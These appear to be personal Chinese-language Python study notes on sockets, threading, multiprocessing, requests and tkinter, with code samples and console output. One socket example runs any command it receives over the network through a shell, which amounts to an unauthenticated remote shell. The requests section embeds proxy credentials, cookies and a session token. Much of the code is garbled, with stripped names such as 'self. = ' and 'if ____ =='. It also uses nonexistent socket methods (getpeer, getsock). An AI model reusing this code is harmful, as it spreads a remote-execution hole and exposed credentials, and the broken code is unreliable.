print(hello())
print(hello())

#不包装
def hello(a=1,b=2):
       return ("a+b=",a+b)

print(hello())

#对比可知,代参数包装时,应该加三个return


}
#***********************************装饰器部分结束***********************************
socket编程{
http://www.cnblogs.com/wupeiqi/articles/5040823.html
http://www.cnblogs.com/aylin/p/5572104.html
注意点：
    1.基于python3.5.2版本的socket只能收发字节(python2.7可以发送字符串)；
    2.客户端退出不能影响服务端；
    3.sk.accept()和sk.recv()是阻塞的(连接正常的情况下)；
    4.send返回发送的字节数并且不一定把全部数据发送。sendall会循环调用send,直至全部发送.



详细介绍：
sk.bind(address)
　　sk.bind(address) 将套接字绑定到地址。address地址的格式取决于地址族。在AF_INET下,以元组(host,port)的形式表示地址。
sk.listen(backlog)
　　开始监听传入连接。backlog指定在拒绝连接之前,可以挂起的最大连接数量。 backlog等于5,表示内核已经接到了连接请求,但服务器还没有调用accept进行处理的连接个数最大为5。 这个值不能无限大,因为要在内核中维护连接队列
sk.setblocking(bool)
　　是否阻塞(默认True),如果设置False,那么accept和recv时一旦无数据,则报错。
sk.accept()
　　接受连接并返回(conn,address),其中conn是新的套接字对象,可以用来接收和发送数据。address是连接客户端的地址。
　　接收TCP 客户的连接(阻塞式)等待连接的到来
sk.connect(address)
　　连接到address处的套接字。一般,address的格式为元组(host,port),如果连接出错,返回socket.error错误。
sk.connect_ex(address)
　　同上,只不过会有返回值,连接成功时返回 0 ,连接失败时候返回编码,例如：10061
sk.close()
　　关闭套接字

sk.recv(bufsize[,flag])
　　接受套接字的数据。数据以字符串形式返回,bufsize指定最多可以接收的数量。flag提供有关消息的其他信息,通常可以忽略。
sk.recvfrom(bufsize[.flag])
　　与recv()类似,但返回值是(data,address)。其中data是包含接收数据的字符串,address是发送数据的套接字地址。
sk.send(bytes[,flag])
　　将bytes中的数据发送到连接的套接字。返回值是要发送的字节数量,该数量可能小于bytes的字节大小。即：可能未将指定内容全部发送。
sk.sendall(bytes[,flag])
　　将bytes中的数据发送到连接的套接字,但在返回之前会尝试发送所有数据。成功返回None,失败则抛出异常。
内部通过递归调用send,将所有内容发送出去。
sk.sendto(bytes[,flag],address)
　　将数据发送到套接字,address是形式为(ipaddr,port)的元组,指定远程地址。返回值是发送的字节数。该函数主要用于UDP协议。
sk.settimeout(timeout)
　　设置套接字操作的超时期,timeout是一个浮点数,单位是秒。值为None表示没有超时期。一般,超时期应该在刚创建套接字时设置,因为它们可能用于连接的操作(如 client 连接最多等待5s )

sk.getpeer()
　　返回连接套接字的远程地址。返回值通常是元组(ipaddr,port)。
sk.getsock()
　　返回套接字自己的地址。通常是一个元组(ipaddr,port)
sk.fileno()
　　套接字的文件描述符


例子1{

#服务端
#!/usr/bin/env python
# Version = 3.4
import socket
#socket模块是针对 服务器端 和 客户端Socket 进行【打开】【读写】【关闭】
ip_port = ('127.0.0.1',9999)

sk = socket.socket()
sk.bind(ip_port)
sk.listen(5)
sk.settimeout(50.0)
print(sk.getsock())	#返回套接字自己的地址。通常是一个元组(ipaddr,port)
print("===================")
while True:
    print('server waiting   ')
    conn, addr = sk.accept()
    client_data = conn.recv(1024)
    print(conn,addr)
    print(type(client_data))
    print(str(client_data,encoding='utf8'))
    conn.sendall(client_data)
    #conn.sendall(bytes("fanhuigeiclient",encoding='utf8'))
    client_data = conn.recv(1024)
    print(str(client_data,encoding='utf8'))
    conn.close()

"""
root@api:/home/lgj/python/socket# python3.4 s1.py
('127.0.0.1', 8082)
===================
server waiting   
<socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('127.0.0.1', 8082), raddr=('127.0.0.1', 39695)> ('127.0.0.1', 39695)
<class 'bytes'>
bbbbbbbbbbbbbaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
hello world!
"""

#客户端
#!/usr/bin/env python
# Version = 3.4
import socket
ip_port = ('127.0.0.1',9999)

sk = socket.socket()
sk.connect(ip_port)
sk.sendall(bytes('bbbbbbbbbbbbbaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',encoding='utf8'))
server_reply = sk.recv(10)
print(str(server_reply,encoding='utf8')) #接收不完,还可以接收
server_reply = sk.recv(100)
print(str(server_reply,encoding='utf8'))
print(sk.getpeer()) #返回连接套接字的远程地址
print(sk.fileno())
print("000000000000000000000000000")
sk.sendto(b'hello world!',('127.0.0.1',9999))
sk.close()

"""
root@api:/home/lgj/python/socket# python3.4 c1.py
bbbbbbbbbb
bbbaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
('127.0.0.1', 8082)
3
000000000000000000000000000
"""

}

#连续发消息,结束时,不影响服务端,不遗留数据
例2{

#!/usr/bin/env python
# Version = 3.4
import socket
ip_port = ('127.0.0.1', 9995)
server = socket.socket()
server.bind(ip_port)
server.listen(3)
# 此while循环为了持续的接收连接(当一个连接断开,接收另一个)
while True:
    conn, addr = server.accept()
    # 此while循环为了持续收发消息
    while True:
        try:
            recv_data = conn.recv(1024)
            print(recv_data,'xxx')
            if recv_data == bytes('exit',encoding='utf8'):
                break
            elif len(recv_data) == 0: # 当客户端发送空后,服务端退出本次连接
                break
            send_data = recv_data.upper()
            conn.send(send_data)
        except Exception as e:
            print(e)
            break
    conn.close()


#!/usr/bin/env python
# Version = 3.4
import socket
ip_port = ('127.0.0.1', 9995)
# 买手机
client = socket.socket()
# 拨号
client.connect(ip_port)
while True:
    # 发消息
    send_data = input('>>>').strip()
    client.send(bytes(send_data, encoding='utf8'))
    if send_data == 'exit':
        break
    elif send_data == '':
        continue
    # 收消息
    recv_data = client.recv(1024)
    print('>>>{}'.format(str(recv_data, encoding='utf8')))


}

例3{
粘包问题:
当服务端要反馈的数据大于客户端一次能接收的大小时,服务端的剩余数据就会"残留"在服务器端,下次反馈数据时会先把残存的数据先发送到客户端,造成请求的数据和反馈的数据不相对应,这种现象就是 粘包。
解决粘包的方法很简单,就是服务器端提前告诉客户端要发送多大的数据,然后客户端循环接收,直到接收完毕,退出循环。

代码实现：
服务器端：
#!/usr/bin/env python
# Version = 3.5.2
import socket, subprocess
ip_port = ('127.0.0.1', 9999)
server = socket.socket()
server.bind(ip_port)
server.listen(3)
# 此while循环为了持续的接收连接(当一个连接断开,接收另一个)
while True:
    conn, addr = server.accept()
    # 此while循环为了持续收发消息
    while True:
        try:  # 客户端异常关闭处理
            recv_data = conn.recv(1024)
            print(recv_data,'xxx')
            if recv_data == bytes('exit', encoding='utf8'):
                break
            elif len(recv_data) == 0:  # 当客户端发送空后,服务端退出本次连接
                break
            p = subprocess.Popen(str(recv_data,encoding='utf8'),shell=True,stdout=subprocess.PIPE)
            res = p.stdout.read()
            if len(res) == 0:  # 客户端输入错误命令时,服务端返回空
                send_data = 'cmd error'
            else:
                # 将gbk转为utf8,需要先转为str作为过度
                send_data = str(res, encoding='gbk')
                send_data = bytes(send_data, encoding='utf8')
            # 发送一个说明,告诉客户端要发送多大的包(解决粘包问题)
            ready_flag = 'Ready|{}'.format(len(send_data))
            conn.send(bytes(ready_flag, encoding='utf8'))
            feed_back = conn.recv(1024)
            feed_back = str(feed_back,encoding='utf8')
            if feed_back == 'Start':
                conn.send(send_data)
                print(str(send_data, encoding='utf8'))
        except Exception as e:
            print(e)
            break
    conn.close()


客户端：
#!/usr/bin/env python
# Version = 3.5.2
import socket
ip_port = ('127.0.0.1', 9999)
# 买手机
client = socket.socket()
# 拨号
client.connect(ip_port)
while True:
    # 发消息
    send_data = input('>>>').strip()
    client.send(bytes(send_data, encoding='utf8'))
    if send_data == 'exit':
        break
    elif send_data == '':
        continue
    # 处理服务端发送过来的说明,明确即将收多大包(解决粘包问题)
    ready_tag = client.recv(1024)
    ready_tag = str(ready_tag, encoding='utf8')
    if ready_tag.startswith('Ready'):
        msg_size = int(ready_tag.split('|')[-1])
    start_tag = 'Start'
    client.send(bytes(start_tag,encoding='utf8'))

    recv_size = 0
    recv_msg = b''
    while recv_size < msg_size:
        recv_data = client.recv(1024)
        recv_msg += recv_data
        recv_size += len(recv_data)
        print(recv_size,msg_size)
    # 收消息
    print('>>>{}'.format(str(recv_msg, encoding='utf8')))

}

例子4
{
#上传文件

#服务端
#!/usr/bin/env python
# Version = 3.4
import socket

sk = socket.socket()

sk.bind(("127.0.0.1",8081))
sk.listen(5)

while True:
	conn,address = sk.accept()
	conn.sendall(bytes("欢迎光临我爱我家",encoding="utf-8"))

	size = conn.recv(1024)
	size_str = str(size,encoding="utf-8")
	file_size = int(size_str)
	print("将要准备:",file_size)

	conn.sendall(bytes("开始接收传送", encoding="utf-8"))

	has_size = 0
	f = open("jj2.png","wb")
	while True:
		if file_size == has_size:
			print("已接收完全")
			break
		date = conn.recv(5120)
		print("接收了datesize:",len(date))
		f.write(date)
		has_size += len(date)

	f.close()
	conn.sendall(bytes("结束接收传送", encoding="utf-8"))
	break

#客户端

#!/usr/bin/env python
# Version = 3.4
import socket
import os

obj = socket.socket()
obj.connect(("127.0.0.1",8081))

ret_bytes = obj.recv(1024)
ret_str = str(ret_bytes,encoding="utf-8")
print(ret_str)

size = os.stat("jj.png").st_size
print("size:",size)
obj.sendall(bytes(str(size),encoding="utf-8"))

ret_bytes=obj.recv(1024)
ret_str = str(ret_bytes,encoding="utf-8")
print(ret_str)

with open("jj.png","rb") as f:
	for line in f:
		print("发送size:",len(line))
		obj.sendall(line)

ret_bytes = obj.recv(1024)
ret_str = str(ret_bytes,encoding="utf-8")
print(ret_str)
}

例子5{
#!/usr/bin/env python
# Version = 3.4
#利用select实现伪同时处理多个Socket客户端请求读写分离
import socket
import select

sk1 = socket.socket()
sk1.bind(('127.0.0.1', 8001))
sk1.listen(5)

inputs = [sk1, ]
outputs = []
message_dict = {}

while True:
    r_list, w_list, e_list = select.select(inputs, outputs, inputs, 1)
    print('正在监听的socket对象%d' % len(inputs))
    print(r_list)
    for sk1_or_conn in r_list:
        #每一个连接对象
        if sk1_or_conn == sk1:
            # 表示有新用户来连接
            conn, address = sk1_or_conn.accept()
            inputs.append(conn)
            message_dict[conn] = []
        else:
            # 有老用户发消息了
            try:
                data_bytes = sk1_or_conn.recv(1024)
            except Exception as ex:
                # 如果用户终止连接
                inputs.remove(sk1_or_conn)
            else:
                data_str = str(data_bytes, encoding='utf-8')
                message_dict[sk1_or_conn].append(data_str)
                outputs.append(sk1_or_conn)

    #w_list中仅仅保存了谁给我发过消息
    for conn in w_list:
        recv_str = message_dict[conn][0]
        del message_dict[conn][0]
        conn.sendall(bytes(recv_str+'好', encoding='utf-8'))
        outputs.remove(conn)

    for sk in e_list:
        inputs.remove(sk)



#!/usr/bin/env python
# Version = 3.4
import socket

obj = socket.socket()

obj.connect(('127.0.0.1',8001))

while True:
    inp = input("Please(q\退出):\n>>>")
    obj.sendall(bytes(inp,encoding="utf-8"))
    if inp == "q":
        break
    ret = str(obj.recv(1024),encoding="utf-8")
    print(ret)

}

例子6{
#读写分离,是例子5的较完整版
#!/usr/bin/env python
# -*- coding:utf-8 -*-
import socket
import select
import queue
ip_port = ('127.0.0.1', 8001)

sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # 创建socket对象
sk.bind(ip_port)  # 绑定ip、端口
sk.listen(5)  # 监听
sk.setblocking(False)  # 不阻塞

inputs = [sk, ]
outputs = []
message = {}
while True:
    rlist, wlist, eList = select.select(inputs, outputs, inputs, 0.5)
    print("inputs:", inputs)  # 查看inputs列表变化
    print("rlist:", rlist)  # 查看rlist列表变化
    print("message:",message)
    for r in rlist:
        if r == sk:  # 服务端的文件描述符有变化,则表示服务端接受到了新客户端的请求,并加入inputs列表
            conn, address = r.accept()
            inputs.append(conn)  # 把连接的句柄加入inputs列表监听
            message[conn] = queue.Queue()  # 每个新的句柄对应一个队列
            print("address:",address)
        else:
            client_data = r.recv(1024)
            print("read_data:", client_data)
            if client_data:  # 如果有数据,返回数据
                outputs.append(r)
                message[r].put(client_data)  # 在指定队列中插入数据
            else:
                inputs.remove(r)  # 否则移除
                del message[r]  # 删除队列

    for w in wlist:  # 如果wlist列表有值
        try:
            data = message[w].get_nowait()  # 去指定队列取数据
            print("write_data:", date)
            w.sendall(b"server get your message " + data)
        except queue.Empty:
            pass
        outputs.remove(w)  # 因为output列表只要有数据每次都会加入wlist列表,所以发送完数据都要移除

    for e in eList:
        inputs.remove(e)  # 删除inputs监听的错误句柄
        if e in outputs:  # 如果outputs里有也删除
            outputs.remove(e)
        e.close()
        del message[e]  # 删除队列
}

精华版 socket实现http请求
{
# python socket实现http请求
import socket
import time
# curl -k -v -X GET http://10.175.102.22:8091/sessions
# coding:UTF-8
# 发送的http包头
header_send = 'GET /sessions HTTP/1.1\r\nHost: 10.175.102.22:8091\r\nConnection: close\r\n\r\n'
i = 0
# 请求次数
num = 1
# 请求间隔
tinktime = 1
# 目的地址
ip_dst = '10.175.102.22'
# 目的端口
port_dst = 8091
while i < num:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_dst, port_dst))
    s.send(header_send.encode("utf-8"))
    i = i + 1
buffer = []
while True:
    # 每次最多接收1k字节:
    d = s.recv(1024)
    if d:
        buffer.append(d)
    else:
        break
data = b''.join(buffer)
s.close()
result = b'200 OK' in data
if result:
    print(data)
else:
    print('web error')
    i = i + 1
    time.sleep(tinktime)


#进阶版
#使用socket模拟http请求,完成全过程协程操作
# curl -k -v -X GET http://10.175.102.22:8091/sessions
import asyncio
import time
# python socket 实现http请求,asyncio.open_connection包装了socket
async def wget(host):
    #print("wget %s   " % host)
    connect = asyncio.open_connection(host, 8091)
    reader, writer = await connect
    header = 'GET /sessions HTTP/1.1\r\nHost: 10.175.102.22:8091\r\nConnection: close\r\n\r\n'
    writer.write(header.encode("utf-8"))
    # writer.write("/sessions".encode("utf-8"))
    await writer.drain()
    while True:
        line = await reader.readline()
        #print("line:", line)
        if line == b"":
            break
        #print('%s header > %s' % (host, line.decode('utf-8').rstrip()))
    writer.close()
t1 = time.time()
for x in range(10):
    loop = asyncio.get_event_loop()
    tasks = [wget('10.175.102.22') for x in range(100)]
    loop.run_until_complete(asyncio.wait(tasks))
loop.close()
t2 = time.time()
print(t2 - t1)
#3.35s
#
#
#
"""

# curl -k -v -X GET http://10.175.102.22:8091/sessions

root@api:~# curl -k -v -X GET http://10.175.102.22:8091/sessions
* Host was NOT found in DNS cache
*   Trying 10.175.102.22   
* Connected to 10.175.102.22 (10.175.102.22) port 8091 (#0)
> GET /sessions HTTP/1.1
> User-Agent: curl/7.35.0
> Host: 10.175.102.22:8091
> Accept: */*
>
< HTTP/1.1 200 OK
< Content-Type: application/xml
< Date: Fri, 08 Sep 2017 08:08:30 GMT
< Connection: keep-alive
< Transfer-Encoding: chunked
<
* Connection #0 to host 10.175.102.22 left intact
<session><status>NOTFOUND</status><success>true</success><token>697a4e434b6c7775664448686247446d425574467258686c4c784e44724e7a58466d4d6b5251784f77576a4b</token><id>4d0f05de165151129d5c5c96f13ca3aa</id></session


第1行：方法,请求的内容,HTTP协议的版本
下载一般可以用GET方法,请求的内容是"/index.html",HTTP协议的版本是指浏览器支持的版本,对于下载软件来说无所谓,所以用1.1版 "HTTP/1.1"；
"GET /index.html HTTP/1.1"
第2行：主机名,格式为"Host:主机"
在这个例子中是："Host:www.sina.com.cn"
第3行：接受的数据类型,下载软件当然要接收所有的数据类型,所以：
"Accept:*/*"
第4行：指定浏览器的类型
有些服务器会根据客户服务器种类的不同会增加或减少一些内容,在这个例子中可以这样写：
"User-Agent:Mozilla/4.0 (compatible; MSIE 5.00; Windows 98)"
第5行：连接设置
设定为一直保持连接："Connection:Keep-Alive"
第6行：若要实现断点续传则要指定从什么位置起接收数据,格式如下：
"Range: bytes=起始位置 - 终止位置"
比如要读前500个字节可以这样写："Range: bytes=0 - 499"；从第 1000 个字节起开始下载：
"Range: bytes=999 -"

最后,别忘了加上一行空行,表示请求头结束。整个请求头如下：
GET /index.html HTTP/1.1
Host:www.sina.com.cn
Accept:*/*
User-Agent:Mozilla/4.0 (compatible; MSIE 5.00; Windows 98)
Connection:Keep-Alive

"""
}

}

多线程 threading{

核心是继承threading.Thread类,通过修改Thread类的run()方法来定义线程所要执行的命令,并调用start()方法来运行线程, join让主线程等待每个线程返回,

threading.Thread 类是主要的线程类,可以创建进程实例。该类提供的函数包括：
get(self) 返回线程的名字
isAlive(self) 布尔标志,表示这个线程是否还在运行中
isDaemon(self) 返回线程的daemon标志
join(self, timeout=None) 程序挂起,直到线程结束,如果给出timeout,则最多阻塞timeout秒
run(self) 定义线程的功能函数
setDaemon(self, True)  把线程的daemon标志设为 True 主线程不等待子线程,而是在退出时自动结束所有的子线程,设置子线程为后台线程(daemon)
set(self, ) 设置线程的名字
start(self) 开始线程执行

#创建锁
lock = threading.Lock()
#锁定
lock.acquire([timeout]) #锁定方法acquire可以有一个超时时间的可选参数timeout。如果设定了timeout,则在超时后通过返回值可以判断是否得到了锁,从而可以进行一些其他的处理。
#释放
lock.release()


#样例
{
#!/usr/bin/python3.4
# -*- coding: utf-8 -*-
#听歌不占用时间、写代码和吃辣条需要时间互斥
import time
import threading

# 打开线程锁
lock = threading.Lock()

class MyThread(threading.Thread):
    def __init__(self, func, args, =''):
        threading.Thread.__init__(self)
        self. = 
        self.func = func
        self.args = args
        #self.counter = counter

    def run(self):
        # 某某线程要开始了
        print(self. + "开始了##################")

        if self. == "听歌线程":
            matter1(music)
        elif self. == "打码线程":
            matter2(number)
        elif self. == "零食线程":
            matter3(snacks)
        print(self. + "结束了##################")

def matter1(music):
    for i in range(0,len(music)):
        print("第" + str(i + 1) + "首歌是：" + str(music[i]))
        # 假设每一首歌曲的时间是2秒
        time.sleep(6)
        print("切换下一首歌   ")

def matter2(number):
    lock.acquire()		#加锁,锁住相应的资源
    j = 0
    while j <= number:
        print("正在写第" + str(j + 1) +"行代码")
        j = j + 1
        # 假设每写一行代码的时间为1秒
        time.sleep(0.5)
        print("第"+ str(j) +"行代码写好了!")
    lock.release()		#解锁,离开该资源

def matter3(snacks):
    lock.acquire()		#加锁,锁住相应的资源
    for k in range(0,len(snacks)):
        print("我正在听着歌吃" + str(snacks[k]) + "零食")
        #每吃一袋零食间隔5秒
        time.sleep(5)
        print("吃完了一包零食")
    lock.release()		#解锁,离开该资源

if ____ == '__main__':
    # 设定我要听的歌为
    music = ["music1","music2","music3"]

    # 设定我要打码的行数
    number = 4

    # 设定我想吃的零食
    snacks = ["咪咪","辣条"]

    # 开始时间
    start = time.time()

    thing1 = MyThread(matter1, music, "听歌线程")
    thing2 = MyThread(matter2, number, "打码线程")
    thing3 = MyThread(matter3, snacks, "零食线程")
    thing1.start()
    thing2.start()
    thing3.start()
    thing1.join()
    thing2.join()
    thing3.join()

    # 结束时间
    end = time.time()
    print("完成的时间为：" + str(end - start))





#!/usr/bin/python3.4
# -*- coding: utf-8 -*-
# 听歌不占用时间、写代码和吃辣条需要时间互斥,上面的实例是先写代码写完再吃零食,下面修改锁的位置,使写代码和吃零食相交运行
import time
import threading

# 打开线程锁
lock = threading.Lock()


class MyThread(threading.Thread):
    def __init__(self, func, args, =''):
        threading.Thread.__init__(self)
        self. = 
        self.func = func
        self.args = args
        #self.counter = counter

    def run(self):
        # 某某线程要开始了
        print(self. + "开始了##################")

        if self. == "听歌线程":
            matter1(music)
        elif self. == "打码线程":
            matter2(number)
        elif self. == "零食线程":
            matter3(snacks)
        print(self. + "结束了##################")


def matter1(music):
    for i in range(0, len(music)):
        print("第" + str(i + 1) + "首歌是：" + str(music[i]))
        # 假设每一首歌曲的时间是2秒
        time.sleep(6)
        print("切换下一首歌   ")


def matter2(number):
    j = 0
    while j <= number:
        lock.acquire()  # 加锁,锁住相应的资源
        print("正在写第" + str(j + 1) + "行代码")
        j = j + 1
        # 假设每写一行代码的时间为1秒
        time.sleep(0.5)
        lock.release()  # 解锁,离开该资源
        print("第" + str(j) + "行代码写好了!")


def matter3(snacks):

    for k in range(0, len(snacks)):
        lock.acquire()  # 加锁,锁住相应的资源
        print("我正在听着歌吃" + str(snacks[k]) + "零食")
        # 每吃一袋零食间隔5秒
        time.sleep(5)
        lock.release()  # 解锁,离开该资源
        print("吃完了一包零食")


if ____ == '__main__':
    # 设定我要听的歌为
    music = ["music1", "music2", "music3", "music4"]

    # 设定我要打码的行数
    number = 10

    # 设定我想吃的零食
    snacks = ["咪咪", "辣条", "可乐", "火腿", "花生"]

    # 开始时间
    start = time.time()

    thing1 = MyThread(matter1, music, "听歌线程")
    thing2 = MyThread(matter2, number, "打码线程")
    thing3 = MyThread(matter3, snacks, "零食线程")
    thing1.start()
    thing2.start()
    thing3.start()
    thing1.join()
    thing2.join()
    thing3.join()

    # 结束时间
    end = time.time()
    print("完成的时间为：" + str(end - start))



}

#线程不安全的样例
{
# encoding: UTF-8
#线程不安全的例子:没有控制多个线程对同一资源的访问,对数据造成破坏,使得线程运行的结果不可预期
import threading
import time

class MyThread(threading.Thread):
    def run(self):
        global num
        time.sleep(1)
        num = num+1
        msg = self.+' set num to '+str(num)
        print(msg)
num = 0
def test():
    for i in range(5):
        t = MyThread()
        t.start()
if ____ == '__main__':
    test()
    print('print都在一行里了,是代表是同时执行的,这个print是单独执行的,会有换行')
}

加锁后{
# encoding: UTF-8
#线程不安全的例子:没有控制多个线程对同一资源的访问,对数据造成破坏,使得线程运行的结果不可预期
import threading
import time

class MyThread(threading.Thread):
    def run(self):
        global num
        lock.acquire()
        time.sleep(1)
        num = num+1
        msg = self.+' set num to '+str(num)
        print(msg)
        lock.release()
num = 0
lock = threading.Lock()
def test():
    for i in range(5):
        t = MyThread()
        t.start()
    t.join()
if ____ == '__main__':
    test()
    print('print都在一行里了,是代表是同时执行的,这个print是单独执行的,会有换行')
}
#join()方法使得线程可以等待另一个线程的运行,而 setDaemon() 方法使得线程在结束时不等待子线程。join和setDaemon都可以改变线程之间的运行顺序。
#join()方法,调用该方法的线程将等待直到该Thread对象完成,再恢复运行
#注意:  join()方法的位置是在for循环外的，也就是说必须等待for循环里的两个进程都结束后，才去执行主进程。
#线程等待
{
import threading
import random
import time

class MyThread(threading.Thread):

    def run(self):
        wait_time=random.randrange(1,10)
        print ("%s will wait %d seconds   ." % (self., wait_time))
        time.sleep(wait_time)
        print ("%s finished!" % self.)

if ____=="__main__":
    threads = []
    for i in range(5):
        t = MyThread()
        t.start()
        threads.append(t)
    print ('main thread is waitting for exit   '  )
    for t in threads:
        t.join()
        print("等待")

    print('main thread finished!')


# 加上join 运行结果   print ('main thread finished!')等待5个子进程结束
{
>>>
Thread-1 will wait 9 secondsThread-2 will wait 1 secondsmain thread is waitting for exit   Thread-3 will wait 9 secondsThread-4 will wait 3 seconds
Thread-5 will wait 2 seconds




Thread-2 finished!
Thread-5 finished!
Thread-4 finished!
Thread-1 finished!Thread-3 finished!

main thread finished!
>>>
}

import threading
import random
import time

class MyThread(threading.Thread):

    def run(self):
        wait_time=random.randrange(1,10)
        print ("%s will wait %d seconds" % (self., wait_time))
        time.sleep(wait_time)
        print ("%s finished!" % self.)

if ____=="__main__":
    threads = []
    for i in range(5):
        t = MyThread()
        t.start()
        threads.append(t)
    print ('main thread is waitting for exit   '  )
    #for t in threads:
        #t.join()

    print ('main thread finished!')
# 去掉join 运行结果		print ('main thread finished!')先结束,5个子进程后结束
{
>>>
Thread-1 will wait 8 secondsmain thread is waitting for exit   Thread-2 will wait 8 secondsThread-3 will wait 8 secondsThread-4 will wait 3 secondsThread-5 will wait 9 seconds





main thread finished!
>>> Thread-4 finished!
Thread-1 finished!Thread-3 finished!Thread-2 finished!


Thread-5 finished!

>>>
}







}



}

多进程 multiprocessing  {
#参考  http://www.cnblogs.com/kaituorensheng/p/4445418.html
http://www.cnblogs.com/liuyansheng/p/5959403.html

#unix系统中:
from multiprocessing import Process
import os
import time
# 子进程要执行的代码

def run_proc():
    time.sleep(20)
    print('Run child process %s (%s)   ' % (, os.getpid()))

if ____=='__main__':
    print('Parent process %s.' % os.getpid())
    time.sleep(20)
    p = Process(target=run_proc, args=('test',))
    print('Child process will start.')
    p.start()
    p.join()
    print('Child process end.')


结果{
Parent process 201779.
Child process will start.
Run child process test (201830)   
Child process end.

root@api:~# ps -ef|grep python
root     201779 147500  0 11:30 pts/18   00:00:00 python3.4 prosss.py
root     201830 201779  0 11:30 pts/18   00:00:00 python3.4 prosss.py
root     201870 146860  0 11:30 pts/25   00:00:00 grep --color=auto python
}

#windows下:
{
from multiprocessing import Process
import os

# 子进程要执行的代码
def run_proc():
    print('Run child process %s (%s)   ' % (, os.getpid()))
    open('c:\\xxxx.log','w')

if ____=='__main__':
    print('Parent process %s.' % os.getpid())
    p = Process(target=run_proc, args=('test',))
    print('Child process will start.')
    p.start()
    p.join()
    print('Child process end.')

}

结果{
>>>
Parent process 12236.
Child process will start.
Child process end.
>>>

#看不到子进程的进程号,但确实执行过了,c盘下有文件产生
}

####进程间通信 #######
#!/usr/bin/python
# -*- coding: utf-8 -*
from multiprocessing import Process, Queue, Lock
import os
import time
import random
# 写数据进程


def write(q, lock, ):
    print('Child Process %s starts' % )
    # 加锁
    lock.acquire()
    for value in ['A', 'B', 'C']:
        print('Put %s to queue   ' % value)
        q.put(value)
        time.sleep(random.random())
    # 释放锁
    lock.release()
    print('Child Process %s ends' % )

# 读数据进程


def read(q, lock, ):
    print('Child Process %s starts' % )
    while True:  # 持续地读取q中的数据
        value = q.get()
        print('Get %s from queue.' % value)
    print('Child Process %s ends' % )

if ____ == "__main__":
    # 父进程创建queue,并共享给各个子进程
    q = Queue()
    # 创建锁
    lock = Lock()
    pw = Process(target=write, args=(q, lock, 'WRITE', ))
    pr = Process(target=read, args=(q, lock, 'READ',))
    # 启动子进程pw,写入：
    pw.start()
    # 启动子进程pr,读取：
    pr.start()
    # 等待pw结束：
    pw.join()
    # pr是个死循环,通过terminate杀死：
    pr.terminate()
    print('Test finish.')



root@api:/home/lgj/testfile# python3 pppp.py
Child Process WRITE starts
Put A to queue   
Child Process READ starts
Get A from queue.
Put B to queue   
Get B from queue.
Put C to queue   
Get C from queue.
Child Process WRITE ends
Test finish.
}

正则表达式学习{

#http://www.cnblogs.com/cdinc/p/5789429.html
#http://www.cnblogs.com/huxi/archive/2010/07/04/1771073.html
}

requests库的使用{

#! /usr/bin/env python3

import requests
from requests.auth import HTTPBasicAuth
"""
ms3_url='https://login.qq.com/login/?redirect=http%3A%2F%2Fw3.qq.com%2Fnext%2Findexa.html%3Flocale%3Dzh%23path%3Dhome'
dts_url='http://w3.qq.com/next/indexa.html?locale=zh#path=home'

#登陆3ms
r =requests.get('https://login.qq.com/login/', auth=('', 'passwd'))
print(r.status_code)
#使用HTTPBasicAuth 登陆3ms
r1 =requests.get(ms3_url, auth=HTTPBasicAuth('', 'passwd'))
print(r1.status_code)

#登陆dts >>好像不行,需要很多东西
dts_url2='http://dts.qq.com/net/dts/sys/Global/personalinfodetail.aspx?User=liuguojin%20WX307086'
dts_url3='http://dts.qq.com/net/dts/commonpage/logout.aspx'
r2 =requests.get(dts_url3, auth=('', 'passwd'))
print(r2.status_code)

#在179上可以访问成功百度文库
baiduwenku='http://wenku.baidu.com/?fr=swsy'
proxies = {"http": "http://:passwd@ip:8080","https": "https://:passwd@ip:8080"}
r5=requests.get(baiduwenku,proxies=proxies)
print(r5.status_code)

"""
proxies = {
  "http": "http://:passwd@openproxy.qq.com:8080",
  "https": "https://:passwd@openproxy.qq.com:8080",
}

#使用公司代理登陆博客园  window上也是可以的
import requests
proxies = {
    "http": "http://china\\name:lgj%401234@openproxy.qq.com:8080/",
    "https": "https://china\\name:lgj%401234@openproxy.qq.com:8080/",
}
# 上下两种都可以
# proxies ={
# "http" : r"http://name:lgj@1234@openproxy.qq.com:8080",
# "https" : r"https://name:lgj@1234@openproxy.qq.com:8080",
# }
r = requests.get("https://www.cnblogs.com/",
                 proxies=proxies, verify=False,)
print(r.status_code)
print(r.text)


bky_url2="https://passport.cnblogs.com/user/signin" #登陆界面
cookies={"SERVERID":'9ffd301069c1081a14d128e0c97deda8|1476261710|1476261492',
'_ga':'GA1.2.458476210.1474601742',
'__utmz':'226521935.1474888410.1.1.utmccn=(referral)|utmcsr=zzk.cnblogs.com|utmcct=/s|utmcmd=referral',
'__utma':'226521935.1300967635.1474888410.1474888410.1474888410.1'}

r4=requests.get(bky_url2,proxies=proxies,auth=('', 'passwd'), verify=False,cookies=cookies)
print(r4.status_code)

}

tkinter 图形界面学习{
#http://www.cnblogs.com/kaituorensheng/p/3287652.html
#http://www.cnblogs.com/fuyunbiyi/archive/2012/06/13/2548497.html
#http://www.cnblogs.com/Tommy-Yu/p/4171006.html
#http://www.cnblogs.com/Kobe10/p/5773821.html
#http://www.cnblogs.com/zhangpengshou/p/3626137.html Python-Tkinter几何布局管理
#http://www.cnblogs.com/Kobe10/p/5712233.html 记事本的实现 666
Tkinter 控件详细介绍:
1.Button 按钮。类似标签,但提供额外的功能,例如鼠标掠过、按下、释放以及键盘操作/事件
2.Canvas 画布。提供绘图功能(直线、椭圆、多边形、矩形) ;可以包含图形或位图
3.Checkbutton 选择按钮。一组方框,可以选择其中的任意个(类似 HTML 中的 checkbox)
4.Entry 文本框。单行文字域,用来收集键盘输入(类似 HTML 中的 text)
5.Frame 框架。包含其他组件的纯容器
6.Label 标签。用来显示文字或图片
7.Listbox 列表框。一个选项列表,用户可以从中选择
8.Menu 菜单。点下菜单按钮后弹出的一个选项列表,用户可以从中选择
